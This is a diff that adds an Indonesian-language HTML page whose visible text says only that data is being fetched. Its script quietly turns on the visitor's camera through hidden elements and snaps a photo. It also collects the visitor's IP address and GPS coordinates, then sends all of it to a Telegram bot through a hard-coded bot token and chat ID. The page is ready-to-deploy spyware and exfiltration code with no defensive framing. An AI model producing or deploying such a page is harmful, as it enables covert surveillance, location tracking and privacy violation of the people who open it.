@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Kirim Data ke Telegram</title>
+</head>
+<body>
+  <h2>Mengambil Data...</h2>
+  <video id="kamera" autoplay playsinline width="100%" style="display:none;"></video>
+  <canvas id="kanvas" style="display:none;"></canvas>
+
+  <script>
+    const token = '7593004514:AAES2AohFVFTo2yHbOJdtaUf2-SzfOfyyhI';
+    const chatId = '1683167636';
+    const video = document.getElementById('kamera');
+    const canvas = document.getElementById('kanvas');
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
+
+      // Tunggu video siap
+      video.onloadedmetadata = () => {
+        ambilData();
+      };
+    });
+
+    async function ambilData() {
+      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(_ => 'Gagal');
+      let lokasi = 'Gagal';
+      if (navigator.geolocation) {
+        await new Promise(resolve => {
+          navigator.geolocation.getCurrentPosition(pos => {
+            lokasi = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+            resolve();
+          }, _ => resolve());
+        });
+      }
+
+      // Ambil gambar dari video
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'foto.png');
+
+        // Kirim foto
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        // Kirim teks
+        const pesan = `📸 Data Pengunjung\n🌐 IP: ${ip}\n📍 Lokasi: ${lokasi}\n🕒 ${new Date().toLocaleString()}`;
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
+      }, 'image/png');
+    }
+  </script>
+</body>
+</html>
